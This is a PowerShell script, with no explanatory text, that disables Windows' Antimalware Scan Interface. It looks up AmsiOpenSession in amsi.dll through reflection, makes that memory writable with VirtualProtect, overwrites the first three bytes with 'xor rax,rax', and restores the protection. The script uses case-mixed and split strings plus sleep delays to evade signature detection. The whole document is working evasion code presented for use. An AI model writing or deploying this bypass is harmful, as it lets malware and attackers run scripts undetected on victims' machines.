function lookAlike{
Param($moduleName, $functionName)

$assem = ([AppDomain]::CurreNtDomain.GetAssEmblies() |
Where-Object {$_.GlobAlAssemblyCache -And $_.LOcation.Split('\\')[-1].Equals('Syst''em.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
$tmp=@()
$ass''em.GetMethods() | FoREach-Object{If($_.Name -eq 'GetProcAddress') {$tmp+=$_}}
return $tmp[0].InvOke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

Start-Sleep 5

function getDelegateType{
Param(
[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
[Parameter(Position = 1)] [Type] $delType = [Void]
)

$type = [AppDom''ain]::CurrentDo''main.DefinEDynamicAssEmbly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
[Sys''tem.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType',
'Class, Public, Sealed, AnsiClass, AutoClass', [System.MuLticastDelegate])

$type.DefineConstrUctor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')

return $type.CreateType()
}

Start-Sleep 5

[IntPtr]$amsIAddr = lookAlike amsi.dll AmsiOpenSession
$oldProtect = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookAlike kernel32.dll VirtualProtect),
(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))

$vp.Invoke($amsiAddr, 3, 0x40, [ref]$oldProtect)

Start-SLeep 7

$3b = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($3b, 0, $amsiAddr, 3)

$vp.Invoke($amsiAddr, 3, 0x20, [ref]$oldProtect)
